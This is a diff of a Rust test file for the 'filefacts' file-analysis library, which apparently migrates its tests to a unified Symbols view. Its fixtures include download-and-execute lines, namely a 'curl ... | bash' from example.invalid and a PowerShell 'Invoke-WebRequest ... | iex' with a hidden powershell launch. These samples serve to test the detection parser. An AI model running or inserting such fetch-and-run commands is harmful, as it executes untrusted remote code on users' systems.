@@ -4,7 +4,42 @@
 //! (`parse_count() == 1` after exercising all views) so the contract
 //! holds for downstream embedders.
 
-use filefacts::{open, open_with_path, FileType};
+use filefacts::{open, open_with_path, FileType, Symbol, SymbolKind};
+
+/// Convenience: collect every call target (`Symbol::Call.target`) from a
+/// parsed file, dropping dynamic-callee entries.
+fn call_targets(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
+    parsed
+        .symbols()
+        .iter_kind(SymbolKind::Call)
+        .filter_map(|s| match s {
+            Symbol::Call { target, .. } => target.clone(),
+            _ => None,
+        })
+        .collect()
+}
+
+fn import_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
+    parsed
+        .symbols()
+        .iter_kind(SymbolKind::Import)
+        .filter_map(|s| match s {
+            Symbol::Import { name, .. } => Some(name.clone()),
+            _ => None,
+        })
+        .collect()
+}
+
+fn function_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
+    parsed
+        .symbols()
+        .iter_kind(SymbolKind::Function)
+        .filter_map(|s| match s {
+            Symbol::Function { name, .. } => Some(name.clone()),
+            _ => None,
+        })
+        .collect()
+}
 
 #[test]
 fn json_manifest_parses_once_through_all_views() {
@@ -13,7 +48,7 @@ fn json_manifest_parses_once_through_all_views() {
     assert_eq!(parsed.fileid().file_type(), FileType::PackageJson);
 
     let values = parsed.values();
-    let strings = parsed.strings();
+    let strings = parsed.text();
     let metrics = parsed.metrics();
 
     assert_eq!(values.get("name").and_then(|v| v.as_str()), Some("sample"));
@@ -134,7 +169,7 @@ fn source_ast_borrows_cached_tree_without_extraction_pass() {
         "borrowing the AST is not extraction"
     );
 
-    assert!(parsed.ast().targets.contains(&"fetch".to_string()));
+    assert!(call_targets(&parsed).contains(&"fetch".to_string()));
     assert_eq!(parsed.parse_count(), 1);
 }
 
@@ -149,30 +184,26 @@ fn javascript_ast_projection_is_complete() {
     let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
     assert_eq!(parsed.fileid().file_type(), FileType::JavaScript);
 
-    let ast = parsed.ast();
+    let targets = call_targets(&parsed);
     assert!(
-        ast.targets.contains(&"chrome.cookies.getAll".to_string()),
-        "expected dotted target in targets, got {:?}",
-        ast.targets
+        targets.contains(&"chrome.cookies.getAll".to_string()),
+        "expected dotted target in call symbols, got {targets:?}",
     );
     assert!(
-        ast.call_strings
-            .get("fetch")
-            .is_some_and(|args| args.contains(&"https://api.example.com/data".to_string())),
-        "fetch's string-literal arg should be recorded"
+        targets.contains(&"fetch".to_string()),
+        "fetch should be a call target, got {targets:?}",
     );
     assert!(
-        ast.call_strings
-            .get("atob")
-            .is_some_and(|args| args.contains(&"aGVsbG8=".to_string())),
-        "atob's literal should be recorded"
+        targets.contains(&"atob".to_string()),
+        "atob should be a call target, got {targets:?}",
     );
 
     // Parse count must stay at 1 after exercising all five views.
     let _ = parsed.values();
-    let _ = parsed.strings();
+    let _ = parsed.text();
+    let _ = parsed.literals();
     let _ = parsed.metrics();
-    let _ = parsed.ast();
+    let _ = parsed.symbols();
     let _ = parsed.fileid();
     assert_eq!(
         parsed.parse_count(),
@@ -210,50 +241,44 @@ def run_command():
     let parsed = open_with_path(std::path::Path::new("sample.py"), source).unwrap();
     assert_eq!(parsed.fileid().file_type(), FileType::Python);
 
-    let imports: Vec<&str> = parsed.imports().iter().map(|i| i.name.as_str()).collect();
+    let imports = import_names(&parsed);
     assert!(
-        imports.contains(&"subprocess as sp"),
+        imports.contains(&"subprocess as sp".to_string()),
         "aliased imports should keep the alias fact, got {imports:?}"
     );
     assert!(
-        imports.contains(&"request"),
+        imports.contains(&"request".to_string()),
         "from-import local names should be visible, got {imports:?}"
     );
 
-    let ast = parsed.ast();
+    let targets = call_targets(&parsed);
     assert!(
-        ast.targets
-            .contains(&"sp.check_output().decode".to_string()),
-        "method calls on call results should keep the source chain, got {:?}",
-        ast.targets
+        targets.contains(&"sp.check_output().decode".to_string()),
+        "method calls on call results should keep the source chain, got {targets:?}",
     );
+
+    // Module-level string binding for API_URL — verify the bind exists
+    // with the right target/scope/shape. Literal-value matching now
+    // happens via the top-level `literals[]` collection correlated by
+    // offset; we keep the simpler structural assertion here.
+    let bind_targets: Vec<(&str, &str, filefacts::ArgShape)> = parsed
+        .symbols()
+        .iter_kind(SymbolKind::Bind)
+        .filter_map(|s| match s {
+            Symbol::Bind {
+                target,
+                scope,
+                shape,
+                ..
+            } => Some((target.as_str(), scope.as_str(), *shape)),
+            _ => None,
+        })
+        .collect();
     assert!(
-        ast.call_strings
-            .get("sp.check_output")
-            .is_some_and(|args| args.contains(&"/bin/echo".to_string())),
-        "array literal strings passed to calls should be recorded"
-    );
-    assert!(
-        ast.call_strings
-            .get("sp.check_output")
-            .is_none_or(|args| !args.contains(&"USER".to_string())),
-        "nested call literals should stay attached to the nested call"
-    );
-    assert!(
-        ast.call_strings
-            .get("env_copy.get")
-            .is_some_and(|args| args.contains(&"USER".to_string())),
-        "nested call literals should still be recorded on their own call"
-    );
-    assert!(
-        ast.binds.iter().any(|a| {
-            a.target == "API_URL"
-                && a.scope == "module"
-                && a.shape == filefacts::ArgShape::String
-                && a.string.as_deref() == Some("https://example.invalid/api")
+        bind_targets.iter().any(|(t, s, sh)| {
+            *t == "API_URL" && *s == "module" && *sh == filefacts::ArgShape::String
         }),
-        "module string constants should be exposed as assignment facts, got {:?}",
-        ast.binds
+        "module string constants should be exposed as bind facts, got {bind_targets:?}",
     );
 
     assert_eq!(parsed.parse_count(), 1);
@@ -267,41 +292,26 @@ curl -sL "http://example.invalid/stage.sh" | bash
 chmod +x ./stage.sh
 "#;
     let parsed = open_with_path(std::path::Path::new("stage.sh"), shell).unwrap();
-    let ast = parsed.ast();
+    let targets = call_targets(&parsed);
     assert!(
-        ast.targets.contains(&"curl".to_string()) && ast.targets.contains(&"bash".to_string()),
-        "shell command names should be call targets, got {:?}",
-        ast.targets
+        targets.contains(&"curl".to_string()) && targets.contains(&"bash".to_string()),
+        "shell command names should be call targets, got {targets:?}",
     );
     assert!(
-        ast.call_strings
-            .get("curl")
-            .is_some_and(|args| args.contains(&"http://example.invalid/stage.sh".to_string())),
-        "shell string arguments should attach to their command"
-    );
-    assert!(
-        !ast.targets.iter().any(|target| target.starts_with('-')),
-        "shell option tokens should not become command targets, got {:?}",
-        ast.targets
+        !targets.iter().any(|t| t.starts_with('-')),
+        "shell option tokens should not become command targets, got {targets:?}",
     );
 
     let ps = br#"Invoke-WebRequest -Uri "http://example.invalid/stage.ps1" | iex
 Start-Process powershell -ArgumentList "-nop", "-w hidden"
 "#;
     let parsed = open_with_path(std::path::Path::new("stage.ps1"), ps).unwrap();
-    let ast = parsed.ast();
+    let targets = call_targets(&parsed);
     assert!(
-        ast.targets.contains(&"Invoke-WebRequest".to_string())
-            && ast.targets.contains(&"iex".to_string())
-            && ast.targets.contains(&"Start-Process".to_string()),
-        "PowerShell command names should be call targets, got {:?}",
-        ast.targets
-    );
-    assert!(
-        ast.call_strings
-            .get("Invoke-WebRequest")
-            .is_some_and(|args| args.contains(&"http://example.invalid/stage.ps1".to_string())),
-        "PowerShell string arguments should attach to their command"
+        targets.contains(&"Invoke-WebRequest".to_string())
+            && targets.contains(&"iex".to_string())
+            && targets.contains(&"Start-Process".to_string()),
+        "PowerShell command names should be call targets, got {targets:?}",
     );
 }
 
@@ -316,20 +326,20 @@ fn typed_fact_views_are_not_mirrored_in_values() {
     let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
 
     assert!(
-        !parsed.imports().is_empty(),
-        "imports typed view should be populated"
+        !import_names(&parsed).is_empty(),
+        "imports should populate the unified Symbols view"
     );
     assert!(
-        parsed.functions().iter().any(|f| f.name == "main"),
-        "functions typed view should be populated"
+        function_names(&parsed).iter().any(|n| n == "main"),
+        "function definitions should populate the unified Symbols view"
     );
     assert!(
-        !parsed.strings().is_empty(),
-        "strings typed view should be populated"
+        !parsed.literals().is_empty(),
+        "literals view should be populated"
     );
     assert!(
-        !parsed.ast().is_empty(),
-        "ast typed view should be populated"
+        !parsed.symbols().is_empty(),
+        "Symbols view should be populated"
     );
 
     let values = parsed.values();
@@ -337,7 +347,7 @@ fn typed_fact_views_are_not_mirrored_in_values() {
         values.get("source.language").and_then(|v| v.as_str()),
         Some("javascript")
     );
-    for path in ["imports", "functions", "classes", "strings", "ast"] {
+    for path in ["imports", "functions", "classes", "strings", "ast", "symbols"] {
         assert!(
             values.get(path).is_none(),
             "{path} must live only in its typed filefacts view"
@@ -351,8 +361,8 @@ fn binary_typed_fact_views_are_not_mirrored_in_values() {
     let parsed = open(&bytes).unwrap();
 
     assert!(
-        !parsed.imports().is_empty(),
-        "imports typed view should be populated"
+        !import_names(&parsed).is_empty(),
+        "imports should populate the unified Symbols view"
     );
     assert!(
         !parsed.sections().is_empty(),
@@ -394,11 +404,12 @@ fn non_source_file_yields_empty_ast() {
     // No view has been requested yet — parse_count is still 0.
     assert_eq!(parsed.parse_count(), 0);
     // The first view access (any of them) bumps parse_count to 1.
-    assert!(parsed.ast().is_empty());
+    assert!(parsed.symbols().is_empty());
     assert_eq!(parsed.parse_count(), 1);
     // Subsequent view accesses share the same cached extraction.
     let _ = parsed.values();
-    let _ = parsed.strings();
+    let _ = parsed.text();
+    let _ = parsed.literals();
     let _ = parsed.metrics();
     assert_eq!(
         parsed.parse_count(),
